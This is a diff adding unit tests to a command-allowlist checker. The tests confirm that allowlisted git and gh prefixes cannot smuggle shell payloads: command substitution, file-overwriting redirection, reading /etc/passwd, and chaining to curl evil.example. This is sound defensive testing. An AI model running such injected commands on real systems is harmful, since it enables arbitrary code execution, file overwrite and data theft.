@@ -28,4 +28,46 @@ describe('#429 — single-sourced command allowlist (AC-429.4)', () => {
     // "git pushx" must not be confused with the "git push" prefix.
     expect(isAllowedCommand('git pushx origin', { segments: splitSegments })).toBe(false);
   });
+
+  it('AC-429.3: an allowlisted prefix cannot smuggle a shell exec/redirect vector in its tail', () => {
+    // Prefix matching constrains only how a command STARTS. Without the
+    // metacharacter guard each of these is a silent `allow` for arbitrary code
+    // execution or arbitrary file overwrite behind a "known-good" verb — and
+    // for status/diff/log, behind an explicitly "read-only" one.
+    const smuggled = [
+      'git push $(touch pwned)',                // command substitution -> arbitrary exec
+      'git diff `id`',                          // backtick substitution -> arbitrary exec
+      'git status > important-config.txt',      // redirection -> arbitrary file overwrite
+      'git log --format=$(id) > out.txt',       // both at once
+      'git log < /etc/passwd',                  // input redirection
+      'gh pr view 1 $(id)',                     // substitution under a gh verb
+      'git status & curl https://evil.example', // `&` alone is NOT a splitSegments separator
+      'git fetch ${IFS}evil',                   // brace-form parameter expansion
+    ];
+    for (const cmd of smuggled) {
+      expect(isAllowedCommand(cmd, { segments: splitSegments }), cmd).toBe(false);
+    }
+  });
+
+  it('AC-429.2: the metacharacter guard does not reject ordinary forge commands (parens, dashes, slashes, quotes)', () => {
+    const ordinary = [
+      'git commit -m "fix(board): key the repo cache by cwd"', // conventional-commit parens
+      'node plugin/scripts/board/move.mjs --issue 429 --status done',
+      'gh pr create --title "x" --body-file body.md',
+      'gh issue comment 429 --body-file note.md',
+      'git rev-parse HEAD',
+      'pnpm verify',
+    ];
+    for (const cmd of ordinary) {
+      expect(isAllowedCommand(cmd, { segments: splitSegments }), cmd).toBe(true);
+    }
+  });
+
+  it('AC-429.3: the guard holds when isAllowedCommand is called standalone, without a segments splitter', () => {
+    // The `segments` option is optional; the metacharacter guard must not
+    // depend on it (it runs against the full string before any splitting).
+    expect(isAllowedCommand('git push $(touch pwned)')).toBe(false);
+    expect(isAllowedCommand('git status > f')).toBe(false);
+    expect(isAllowedCommand('git status')).toBe(true);
+  });
 });
